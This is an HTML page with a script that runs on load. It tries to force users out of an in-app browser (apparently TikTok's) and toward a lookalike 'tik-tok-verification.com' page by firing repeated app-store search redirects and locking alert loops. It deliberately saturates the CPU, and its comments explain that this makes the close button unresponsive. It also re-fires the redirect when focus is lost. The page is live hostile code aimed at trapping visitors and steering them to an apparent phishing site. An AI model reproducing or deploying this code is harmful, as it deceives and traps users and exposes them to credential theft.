<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 220; 

    function triggerJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        // Direct System Search - the strongest redirect we have
        const trigger = isAndroid 
            ? "market://search?q=" + urlEnc 
            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        window.location.href = trigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Fire the Redirect
        triggerJump();

        // 2. THE LOCK
        alert("ATTEMPT #34\n\nRedirecting to System Browser...\n\nTap OK to continue.");

        // 3. THE "DEAD ZONE" (The 220ms window)
        // We use a micro-loop to keep the CPU busy. 
        // This makes the 'X' button in the TikTok frame laggy and unresponsive.
        const start = Date.now();
        while (Date.now() - start < 100) {
            // Intensive calculation to saturate the UI thread for the first 100ms
            Math.sqrt(Math.random() * 1000000);
        }

        // 4. Wait the remainder of the 220ms gap before the next alert
        setTimeout(() => {
            if (document.hasFocus()) {
                rampage();
            }
        }, gap - 100);
    }

    window.onload = () => {
        rampage();
    };

    // Keep redirect active if focus is lost (minimize/swipe)
    window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
</script>

</body>
</html>
